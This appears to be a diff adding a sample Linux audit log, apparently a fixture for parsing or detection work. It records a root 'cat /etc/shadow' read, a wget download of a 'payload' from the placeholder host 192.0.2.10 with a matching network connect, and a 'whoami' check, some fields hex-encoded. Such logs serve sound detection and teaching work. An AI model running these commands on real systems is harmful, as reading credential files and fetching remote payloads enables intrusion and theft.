@@ -1,0 +1,11 @@
+type=SYSCALL msg=audit(1700000000.101:801): arch=c000003e syscall=59 success=yes exit=0 a0=55f0a1 a1=55f0b2 a2=55f0c3 items=2 ppid=1200 pid=1201 auid=1000 uid=0 gid=0 euid=0 comm="cat" exe="/usr/bin/cat" key="exec"
+type=CWD msg=audit(1700000000.101:801): cwd="/home/analyst"
+type=EXECVE msg=audit(1700000000.101:801): argc=2 a0="cat" a1="/etc/shadow"
+type=PROCTITLE msg=audit(1700000000.101:801): proctitle=636174002F6574632F736861646F77
+type=SYSCALL msg=audit(1700000000.202:802): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=1200 pid=1202 auid=1000 uid=1000 gid=1000 comm="wget" exe=2f7573722f62696e2f77676574 key="exec"
+type=CWD msg=audit(1700000000.202:802): cwd="/tmp"
+type=EXECVE msg=audit(1700000000.202:802): argc=2 a0=77676574 a1="http://192.0.2.10/payload"
+type=SYSCALL msg=audit(1700000000.303:803): arch=c000003e syscall=42 success=yes exit=0 ppid=1200 pid=1203 auid=1000 uid=1000 comm="wget" exe="/usr/bin/wget" key="net"
+type=SOCKADDR msg=audit(1700000000.303:803): saddr=02000050C0000210
+type=SYSCALL msg=audit(1700000000.404:804): arch=c000003e syscall=59 success=yes exit=0 items=1 ppid=1200 pid=1204 auid=1000 uid=1000 comm="whoami" exe=/usr/bin/whoami key="exec"
+type=EXECVE msg=audit(1700000000.404:804): argc=1 a0="whoami"
